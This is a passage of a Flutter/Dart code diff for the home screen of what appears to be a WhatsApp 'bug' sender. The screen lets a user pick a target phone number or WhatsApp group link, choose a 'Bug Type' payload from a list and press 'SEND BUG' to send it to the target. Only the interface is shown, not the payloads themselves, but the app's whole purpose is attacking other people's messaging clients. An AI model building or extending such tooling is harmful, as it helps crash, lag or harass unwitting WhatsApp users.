-            padding: const EdgeInsets.fromLTRB(16, 6, 16, 14),
-            child: Row(
-              children: [
-                Icon(Icons.check_circle_outline_rounded,
-                    color: selectedBugId.isNotEmpty
-                        ? const Color(0xFF16a34a)
-                        : Colors.grey.shade700,
-                    size: 14),
-                const SizedBox(width: 6),
-                Text(
-                  selectedBugId.isNotEmpty
-                      ? '1 payload selected'
-                      : 'No payload selected',
-                  style: TextStyle(
-                    color: selectedBugId.isNotEmpty
-                        ? const Color(0xFF16a34a)
-                        : Colors.grey.shade600,
-                    fontSize: 11,
-                  ),
-                ),
-                const Spacer(),
-                GestureDetector(
-                  onTap: () => setState(() => selectedBugId = ''),
-                  child: Text(
-                    'Clear',
-                    style: TextStyle(
-                      color: accentCyan.withOpacity(0.8),
                       fontSize: 11,
                       fontWeight: FontWeight.w600,
                     ),
@@ -921,376 +401,462 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
               ],
             ),
           ),
+        ),
+      ),
+    );
+  }
+
+  Widget _buildVideoBanner() {
+    return Container(
+      margin: const EdgeInsets.fromLTRB(16, 0, 16, 10),
+      child: ClipRRect(
+        borderRadius: BorderRadius.circular(20),
+        child: _isVideoInitialized
+            ? Stack(
+                children: [
+                  SizedBox(
+                    height: 180,
+                    width: double.infinity,
+                    child: VideoPlayer(_videoController),
+                  ),
+                  // Tambahkan blur overlay
+                  Positioned.fill(
+                    child: BackdropFilter(
+                      filter: ImageFilter.blur(sigmaX: 2, sigmaY: 2),
+                      child: Container(
+                        color: Colors.black.withOpacity(0.1),
+                      ),
+                    ),
+                  ),
+                ],
+              )
+            : Container(
+                height: 180,
+                width: double.infinity,
+                color: Colors.grey[900],
+                child: const Center(
+                  child: CircularProgressIndicator(
+                    color: Colors.white,
+                  ),
+                ),
+              ),
+      ),
+    );
+  }
+
+  Widget _buildModeSwitcher() {
+    return Container(
+      margin: const EdgeInsets.symmetric(vertical: 10, horizontal: 16),
+      child: Row(
+        children: [
+          Expanded(
+            child: _buildModeButton(
+              icon: Icons.person,
+              label: "Contact Bug",
+              isSelected: bugMode == "contact",
+              onTap: () {
+                setState(() {
+                  bugMode = "contact";
+                  // Set bug default untuk contact
+                  if (widget.listBug.isNotEmpty) {
+                    selectedBugId = widget.listBug[0]['bug_id'];
+                  }
+                });
+              },
+            ),
+          ),
+          const SizedBox(width: 12),
+          Expanded(
+            child: _buildModeButton(
+              icon: Icons.groups,
+              label: "Group Bug",
+              isSelected: bugMode == "group",
+              onTap: () {
+                setState(() {
+                  bugMode = "group";
+                  // Set bug default untuk group (hanya 3 bug)
+                  if (groupBugs.isNotEmpty) {
+                    selectedBugId = groupBugs[0]['bug_id'];
+                  }
+                });
+              },
+            ),
+          ),
         ],
       ),
     );
   }
 
-  // ════════════════════════════════════════════════════
-  //  PROGRESS BAR
-  // ════════════════════════════════════════════════════
-  Widget _buildProgressBar() {
-    return Container(
-      padding: const EdgeInsets.all(18),
-      decoration: BoxDecoration(
-        color: cardDark,
-        borderRadius: BorderRadius.circular(18),
-        border: Border.all(color: accentCyan.withOpacity(0.18), width: 1),
-        boxShadow: [
-          BoxShadow(
-            color: accentCyan.withOpacity(0.06),
-            blurRadius: 14,
-            spreadRadius: 1,
+  Widget _buildModeButton({
+    required IconData icon,
+    required String label,
+    required bool isSelected,
+    required VoidCallback onTap,
+  }) {
+    return GestureDetector(
+      onTap: onTap,
+      child: ClipRRect(
+        borderRadius: BorderRadius.circular(16),
+        child: BackdropFilter(
+          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
+          child: Container(
+            padding: const EdgeInsets.symmetric(vertical: 16),
+            decoration: BoxDecoration(
+              color: isSelected
+                  ? Colors.white.withOpacity(0.15)
+                  : Colors.white.withOpacity(0.05),
+              borderRadius: BorderRadius.circular(16),
+              border: Border.all(
+                color: isSelected
+                    ? Colors.white.withOpacity(0.3)
+                    : Colors.white.withOpacity(0.1),
+                width: 1.5,
+              ),
+            ),
+            child: Row(
+              mainAxisAlignment: MainAxisAlignment.center,
+              children: [
+                Icon(
+                  icon,
+                  color: Colors.white,
+                  size: 20,
+                ),
+                const SizedBox(width: 8),
+                Text(
+                  label,
+                  style: TextStyle(
+                    color: Colors.white,
+                    fontSize: 14,
+                    fontWeight: isSelected ? FontWeight.bold : FontWeight.w500,
+                  ),
+                ),
+              ],
+            ),
           ),
-        ],
+        ),
       ),
+    );
+  }
+
+  Widget _buildTargetInput() {
+    return _buildGlassCard(
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
         children: [
-          // Step circles
           Row(
-            children: List.generate(_progressSteps.length, (i) {
-              final done    = i < _currentStep;
-              final current = i == _currentStep;
-              final active  = i <= _currentStep;
-              return Expanded(
-                child: Row(
-                  children: [
-                    Expanded(
-                      child: Center(
-                        child: AnimatedContainer(
-                          duration: const Duration(milliseconds: 250),
-                          width: 30,
-                          height: 30,
-                          decoration: BoxDecoration(
-                            shape: BoxShape.circle,
-                            gradient: active
-                                ? const LinearGradient(
-                                    colors: [mainBlue, accentCyan])
-                                : null,
-                            color: active ? null : deepBlue,
-                            border: Border.all(
-                              color: current
-                                  ? accentCyan
-                                  : accentCyan.withOpacity(0.14),
-                              width: current ? 1.8 : 1,
-                            ),
-                            boxShadow: current
-                                ? [
-                                    BoxShadow(
-                                      color: accentCyan.withOpacity(0.4),
-                                      blurRadius: 10,
-                                      spreadRadius: 1,
-                                    )
-                                  ]
-                                : null,
-                          ),
-                          child: Center(
-                            child: done
-                                ? const Icon(Icons.check_rounded,
-                                    color: Colors.white, size: 14)
-                                : Text(
-                                    '${i + 1}',
-                                    style: TextStyle(
-                                      color: active
-                                          ? Colors.white
-                                          : Colors.grey,
-                                      fontWeight: FontWeight.bold,
-                                      fontSize: 12,
-                                    ),
-                                  ),
-                          ),
-                        ),
-                      ),
-                    ),
-                    if (i < _progressSteps.length - 1)
-                      Expanded(
-                        child: Container(
-                          height: 2,
-                          decoration: BoxDecoration(
-                            gradient: done
-                                ? const LinearGradient(
-                                    colors: [mainBlue, accentCyan])
-                                : null,
-                            color: done ? null : const Color(0xFF0e1822),
-                            borderRadius: BorderRadius.circular(2),
-                          ),
-                        ),
-                      ),
-                  ],
+            children: [
+              Container(
+                padding: const EdgeInsets.all(12),
+                decoration: BoxDecoration(
+                  color: Colors.white.withOpacity(0.08),
+                  borderRadius: BorderRadius.circular(12),
                 ),
-              );
-            }),
+                child: Icon(
+                  bugMode == "contact" ? Icons.phone_android : Icons.link,
+                  color: Colors.white,
+                  size: 24,
+                ),
+              ),
+              const SizedBox(width: 14),
+              Text(
+                bugMode == "contact" ? "Target Number" : "Group Link",
+                style: const TextStyle(
+                  color: Colors.white,
+                  fontWeight: FontWeight.bold,
+                  fontSize: 18,
+                  letterSpacing: 0.5,
+                ),
+              ),
+            ],
           ),
-
-          const SizedBox(height: 16),
-
-          AnimatedBuilder(
-            animation: _progressAnimation,
-            builder: (_, __) {
-              return Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Stack(
-                    children: [
-                      Container(
-                        height: 6,
-                        decoration: BoxDecoration(
-                          color: const Color(0xFF0e1822),
-                          borderRadius: BorderRadius.circular(6),
-                        ),
-                      ),
-                      FractionallySizedBox(
-                        widthFactor:
-                            _progress * _progressAnimation.value,
-                        child: Container(
-                          height: 6,
-                          decoration: BoxDecoration(
-                            gradient: const LinearGradient(
-                                colors: [mainBlue, accentCyan]),
-                            borderRadius: BorderRadius.circular(6),
-                            boxShadow: [
-                              BoxShadow(
-                                color: accentCyan.withOpacity(0.5),
-                                blurRadius: 6,
-                              ),
-                            ],
-                          ),
-                        ),
-                      ),
-                    ],
+          const SizedBox(height: 20),
+          ClipRRect(
+            borderRadius: BorderRadius.circular(16),
+            child: BackdropFilter(
+              filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
+              child: Container(
+                decoration: BoxDecoration(
+                  color: Colors.white.withOpacity(0.05),
+                  borderRadius: BorderRadius.circular(16),
+                  border: Border.all(
+                    color: Colors.white.withOpacity(0.1),
+                    width: 1,
                   ),
-                  const SizedBox(height: 10),
-                  Row(
-                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
-                    children: [
-                      Text(
-                        _progressSteps[_currentStep],
-                        style: const TextStyle(
-                          color: accentCyan,
-                          fontSize: 12,
-                          fontWeight: FontWeight.w600,
-                        ),
-                      ),
-                      Text(
-                        "${(_progress * 100).toInt()}%",
-                        style: const TextStyle(
-                          color: Colors.white,
-                          fontSize: 12,
-                          fontWeight: FontWeight.bold,
-                        ),
-                      ),
-                    ],
+                ),
+                child: TextField(
+                  controller: bugMode == "contact" ? targetController : groupLinkController,
+                  style: const TextStyle(
+                    color: Colors.white,
+                    fontSize: 15,
+                    fontWeight: FontWeight.w500,
                   ),
-                ],
-              );
-            },
+                  cursorColor: Colors.white70,
+                  decoration: InputDecoration(
+                    hintText: bugMode == "contact" 
+                        ? "e.g. +62xxxxxxxxxx"
+                        : "https://chat.whatsapp.com/...",
+                    hintStyle: TextStyle(
+                      color: Colors.white.withOpacity(0.3),
+                      fontSize: 14,
+                    ),
+                    prefixIcon: Icon(
+                      bugMode == "contact" ? Icons.language : Icons.link,
+                      color: Colors.white.withOpacity(0.4),
+                      size: 22,
+                    ),
+                    filled: false,
+                    border: InputBorder.none,
+                    contentPadding: const EdgeInsets.symmetric(
+                      horizontal: 18,
+                      vertical: 16,
+                    ),
+                  ),
+                ),
+              ),
+            ),
           ),
         ],
       ),
     );
   }
 
-  // ════════════════════════════════════════════════════
-  //  SEND BUTTON  — premium style
-  // ════════════════════════════════════════════════════
-  Widget _buildSendButton() {
-    return AnimatedBuilder(
-      animation: _pulseController,
-      builder: (_, child) => Container(
-        decoration: BoxDecoration(
-          borderRadius: BorderRadius.circular(18),
-          boxShadow: _isSending
-              ? []
-              : [
-                  BoxShadow(
-                    color: accentCyan
-                        .withOpacity(0.28 * _pulseController.value),
-                    blurRadius: 28 * _pulseController.value,
-                    spreadRadius: 2,
-                  ),
-                  BoxShadow(
-                    color: mainBlue.withOpacity(0.35),
-                    blurRadius: 16,
-                    offset: const Offset(0, 6),
-                  ),
-                ],
-        ),
-        child: child,
-      ),
-      child: GestureDetector(
-        onTap: _isSending ? null : _sendBugNomor,
-        child: AnimatedContainer(
-          duration: const Duration(milliseconds: 200),
-          width: double.infinity,
-          height: 62,
-          decoration: BoxDecoration(
-            gradient: LinearGradient(
-              colors: _isSending
-                  ? [const Color(0xFF1a2030), const Color(0xFF1a2030)]
-                  : [
-                      const Color(0xFF1565c0),
-                      const Color(0xFF0d47a1),
-                      const Color(0xFF006db3),
-                    ],
-              begin: Alignment.topLeft,
-              end: Alignment.bottomRight,
-            ),
-            borderRadius: BorderRadius.circular(18),
-            border: Border.all(
-              color: _isSending
-                  ? Colors.white.withOpacity(0.05)
-                  : accentCyan.withOpacity(0.4),
-              width: 1.2,
-            ),
-          ),
-          child: Stack(
-            alignment: Alignment.center,
+  Widget _buildBugTypeDropdown() {
+    // Tentukan list bug berdasarkan mode
+    final bugList = bugMode == "contact" ? widget.listBug : groupBugs;
+    
+    return _buildGlassCard(
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
             children: [
-              // ── Shimmer line top ──────────────────
-              if (!_isSending)
-                Positioned(
-                  top: 0,
-                  left: 30,
-                  right: 30,
-                  child: Container(
-                    height: 1,
-                    decoration: BoxDecoration(
-                      gradient: LinearGradient(
-                        colors: [
-                          Colors.transparent,
-                          Colors.white.withOpacity(0.35),
-                          Colors.transparent,
-                        ],
-                      ),
-                    ),
+              Container(
+                padding: const EdgeInsets.all(12),
+                decoration: BoxDecoration(
+                  color: Colors.white.withOpacity(0.08),
+                  borderRadius: BorderRadius.circular(12),
+                ),
+                child: const Icon(
+                  Icons.bug_report,
+                  color: Colors.white,
+                  size: 24,
+                ),
+              ),
+              const SizedBox(width: 14),
+              const Text(
+                "Bug Type",
+                style: TextStyle(
+                  color: Colors.white,
+                  fontWeight: FontWeight.bold,
+                  fontSize: 18,
+                  letterSpacing: 0.5,
+                ),
+              ),
+            ],
+          ),
+          const SizedBox(height: 20),
+          ClipRRect(
+            borderRadius: BorderRadius.circular(16),
+            child: BackdropFilter(
+              filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
+              child: Container(
+                padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 4),
+                decoration: BoxDecoration(
+                  color: Colors.white.withOpacity(0.05),
+                  borderRadius: BorderRadius.circular(16),
+                  border: Border.all(
+                    color: Colors.white.withOpacity(0.1),
+                    width: 1,
                   ),
                 ),
-
-              // ── Content ───────────────────────────
-              _isSending
-                  ? Row(
-                      mainAxisAlignment: MainAxisAlignment.center,
-                      children: [
-                        SizedBox(
-                          width: 20,
-                          height: 20,
-                          child: CircularProgressIndicator(
-                            color: accentCyan,
-                            strokeWidth: 2.5,
+                child: Row(
+                  children: [
+                    Icon(
+                      Icons.settings,
+                      color: Colors.white.withOpacity(0.6),
+                      size: 20,
+                    ),
+                    const SizedBox(width: 12),
+                    Expanded(
+                      child: DropdownButtonHideUnderline(
+                        child: DropdownButton<String>(
+                          dropdownColor: const Color(0xFF1A1A1A),
+                          value: selectedBugId,
+                          isExpanded: true,
+                          icon: Icon(Icons.keyboard_arrow_down, color: Colors.white.withOpacity(0.6)),
+                          style: const TextStyle(
+                            color: Colors.white,
+                            fontSize: 15,
+                            fontWeight: FontWeight.w500,
                           ),
+                          items: bugList.map((bug) {
+                            return DropdownMenuItem<String>(
+                              value: bug['bug_id'],
+                              child: Text(bug['bug_name']),
+                            );
+                          }).toList(),
+                          onChanged: (value) {
+                            setState(() {
+                              selectedBugId = value ?? "";
+                            });
+                          },
                         ),
-                        const SizedBox(width: 14),
-                        Column(
-                          mainAxisAlignment: MainAxisAlignment.center,
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            const Text(
-                              'SENDING BUG...',
-                              style: TextStyle(
-                                color: Colors.white70,
-                                fontWeight: FontWeight.bold,
-                                fontSize: 14,
-                                letterSpacing: 1.5,
-                              ),
-                            ),
-                            Text(
-                              _progressSteps[_currentStep],
-                              style: TextStyle(
-                                color: accentCyan.withOpacity(0.8),
-                                fontSize: 11,
-                              ),
-                            ),
-                          ],
-                        ),
-                      ],
+                      ),
+                    ),
+                  ],
+                ),
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildSendButton() {
+    return Container(
+      margin: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
+      width: double.infinity,
+      height: 62,
+      decoration: BoxDecoration(
+        borderRadius: BorderRadius.circular(20),
+        boxShadow: [
+          BoxShadow(
+            color: Colors.black.withOpacity(0.4),
+            blurRadius: 20,
+            offset: const Offset(0, 8),
+          ),
+        ],
+      ),
+      child: ClipRRect(
+        borderRadius: BorderRadius.circular(20),
+        child: BackdropFilter(
+          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
+          child: Container(
+            decoration: BoxDecoration(
+              color: Colors.white.withOpacity(0.08),
+              borderRadius: BorderRadius.circular(20),
+              border: Border.all(
+                color: Colors.white.withOpacity(0.15),
+                width: 1.5,
+              ),
+            ),
+            child: ElevatedButton(
+              onPressed: _isSending ? null : _sendBug,
+              style: ElevatedButton.styleFrom(
+                backgroundColor: Colors.transparent,
+                shadowColor: Colors.transparent,
+                shape: RoundedRectangleBorder(
+                  borderRadius: BorderRadius.circular(20),
+                ),
+              ),
+              child: _isSending
+                  ? const SizedBox(
+                      height: 26,
+                      width: 26,
+                      child: CircularProgressIndicator(
+                        color: Colors.white,
+                        strokeWidth: 3,
+                      ),
                     )
                   : Row(
                       mainAxisAlignment: MainAxisAlignment.center,
-                      children: [
-                        // Left icon
-                        Container(
-                          width: 36,
-                          height: 36,
-                          decoration: BoxDecoration(
-                            color: Colors.white.withOpacity(0.12),
-                            shape: BoxShape.circle,
-                            border: Border.all(
-                                color: Colors.white.withOpacity(0.2),
-                                width: 1),
-                          ),
-                          child: const Icon(
-                            Icons.bug_report_rounded,
+                      children: const [
+                        Icon(Icons.send, color: Colors.white, size: 22),
+                        SizedBox(width: 12),
+                        Text(
+                          "SEND BUG",
+                          style: TextStyle(
                             color: Colors.white,
-                            size: 18,
-                          ),
-                        ),
-                        const SizedBox(width: 14),
-                        Column(
-                          mainAxisAlignment: MainAxisAlignment.center,
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            const Text(
-                              'SEND BUG',
-                              style: TextStyle(
-                                color: Colors.white,
-                                fontWeight: FontWeight.w900,
-                                fontSize: 16,
-                                letterSpacing: 2,
-                              ),
-                            ),
-                            Text(
-                              'Tap to send payload to target',
-                              style: TextStyle(
-                                color: Colors.white.withOpacity(0.55),
-                                fontSize: 10,
-                                letterSpacing: 0.3,
-                              ),
-                            ),
-                          ],
-                        ),
-                        const SizedBox(width: 14),
-                        // Right arrow
-                        Container(
-                          width: 32,
-                          height: 32,
-                          decoration: BoxDecoration(
-                            color: Colors.white.withOpacity(0.1),
-                            shape: BoxShape.circle,
-                          ),
-                          child: const Icon(
-                            Icons.arrow_forward_rounded,
-                            color: Colors.white,
-                            size: 16,
+                            fontWeight: FontWeight.bold,
+                            fontSize: 16,
+                            letterSpacing: 1.5,
                           ),
                         ),
                       ],
                     ),
-            ],
+            ),
           ),
         ),
       ),
     );
   }
-}
 
-// ════════════════════════════════════════════════════
-//  DOT GRID BACKGROUND PAINTER
-// ════════════════════════════════════════════════════
-class _DotGridPainter extends CustomPainter {
-  @override
-  void paint(Canvas canvas, Size size) {
-    final paint = Paint()
-      ..color = const Color(0xFF00b0ff)
-      ..style = PaintingStyle.fill;
-    const spacing = 28.0;
-    for (double x = 0; x < size.width; x += spacing) {
-      for (double y = 0; y < size.height; y += spacing) {
-        canvas.drawCircle(Offset(x, y), 0.9, paint);
-      }
-    }
+  Widget _buildResponseMessage() {
+    if (_responseMessage == null) return const SizedBox.shrink();
+
+    return Container(
+      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: _responseMessage!.contains("✅")
+            ? Colors.green.withOpacity(0.2)
+            : _responseMessage!.contains("❌")
+                ? Colors.red.withOpacity(0.2)
+                : Colors.orange.withOpacity(0.2),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(
+          color: _responseMessage!.contains("✅")
+              ? Colors.green.withOpacity(0.5)
+              : _responseMessage!.contains("❌")
+                  ? Colors.red.withOpacity(0.5)
+                  : Colors.orange.withOpacity(0.5),
+          width: 1,
+        ),
+      ),
+      child: Text(
+        _responseMessage!,
+        style: const TextStyle(
+          color: Colors.white,
+          fontSize: 14,
+        ),
+        textAlign: TextAlign.center,
+      ),
+    );
   }
 
   @override
-  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
+  Widget build(BuildContext context) {
+    return Scaffold(
+      backgroundColor: Colors.black,
+      body: Stack(
+        children: [
+          Positioned.fill(
+            child: Container(
+              decoration: BoxDecoration(
+                gradient: LinearGradient(
+                  begin: Alignment.topCenter,
+                  end: Alignment.bottomCenter,
+                  colors: [
+                    Colors.black.withOpacity(0.9),
+                    Colors.black.withOpacity(0.7),
+                    Colors.black.withOpacity(0.9),
+                  ],
+                ),
+              ),
+            ),
+          ),
+          
+          SafeArea(
+            child: SingleChildScrollView(
+              padding: const EdgeInsets.symmetric(vertical: 12),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.stretch,
+                children: [
+                  _buildProfileSection(),
+                  _buildVideoBanner(),
+                  _buildModeSwitcher(),
+                  _buildTargetInput(),
+                  _buildBugTypeDropdown(),
+                  _buildSendButton(),
+                  _buildResponseMessage(),
+                  const SizedBox(height: 20),
+                ],
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
 }
